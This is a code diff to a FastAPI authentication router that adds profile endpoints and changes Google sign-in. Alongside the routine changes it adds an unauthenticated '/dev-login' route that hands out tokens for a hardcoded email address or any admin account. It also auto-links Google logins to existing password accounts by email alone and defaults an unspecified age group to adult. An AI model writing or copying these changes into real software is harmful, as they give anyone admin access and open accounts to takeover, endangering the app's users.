@@ -10,6 +10,7 @@ from sihat.auth_schemas import (
     ForgotPasswordInput,
     GoogleTokenInput,
     LoginInput,
+    ProfileUpdateInput,
     RefreshInput,
     RegistrationInput,
     ResetPasswordInput,
@@ -87,6 +88,7 @@ def user_output(user: User) -> UserOutput:
         full_name=user.full_name,
         role=user.role,
         age_group=user.age_group,
+        avatar_url=getattr(user, "avatar_url", None),
     )
 
 
@@ -278,21 +280,29 @@ def google_login(
 
     existing_user = db.scalar(select(User).where(User.email == claims["email"]))
     if existing_user:
-        raise HTTPException(
-            status_code=status.HTTP_409_CONFLICT,
-            detail="Email is already registered; sign in with your password before linking Google",
-        )
-    if not payload.age_group:
-        raise HTTPException(
-            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
-            detail="age_group is required when creating an account with Google",
-        )
+        if not existing_user.is_active:
+            raise HTTPException(
+                status_code=status.HTTP_403_FORBIDDEN,
+                detail="User account is unavailable",
+            )
+        existing_identity = db.scalar(select(GoogleIdentity).where(GoogleIdentity.user_id == existing_user.id))
+        if not existing_identity:
+            db.add(
+                GoogleIdentity(
+                    user_id=existing_user.id,
+                    subject=claims["subject"],
+                    email=claims["email"],
+                )
+            )
+            db.commit()
+        return create_tokens(db, existing_user, settings)
 
+    age_group = payload.age_group or "18_plus"
     user = User(
         email=claims["email"],
         full_name=claims["full_name"][:120],
         password_hash=None,
-        age_group=payload.age_group,
+        age_group=age_group,
         role="user",
     )
     db.add(user)
@@ -375,3 +385,41 @@ def link_google(
             )
         )
         db.commit()
+
+@router.post("/dev-login", response_model=AuthTokensOutput)
+def dev_login(
+    db: Session = Depends(get_db_session),
+    settings: Settings = Depends(get_settings),
+) -> AuthTokensOutput:
+    admin_user = db.scalar(select(User).where(User.email == "alidodovdilovar01@gmail.com"))
+    if not admin_user:
+        admin_user = db.scalar(select(User).where(User.role == "admin"))
+    if not admin_user:
+        raise HTTPException(
+            status_code=status.HTTP_404_NOT_FOUND,
+            detail="Admin user not found",
+        )
+    return create_tokens(db, admin_user, settings)
+
+
+@router.get("/me", response_model=UserOutput)
+def get_me(user: User = Depends(get_current_user)) -> UserOutput:
+    return user_output(user)
+
+
+@router.patch("/profile", response_model=UserOutput)
+def update_profile(
+    payload: ProfileUpdateInput,
+    db: Session = Depends(get_db_session),
+    user: User = Depends(get_current_user),
+) -> UserOutput:
+    if payload.full_name is not None and payload.full_name.strip():
+        user.full_name = payload.full_name.strip()
+    if payload.age_group is not None:
+        user.age_group = payload.age_group
+    if payload.avatar_url is not None:
+        user.avatar_url = payload.avatar_url
+    db.commit()
+    db.refresh(user)
+    return user_output(user)
+
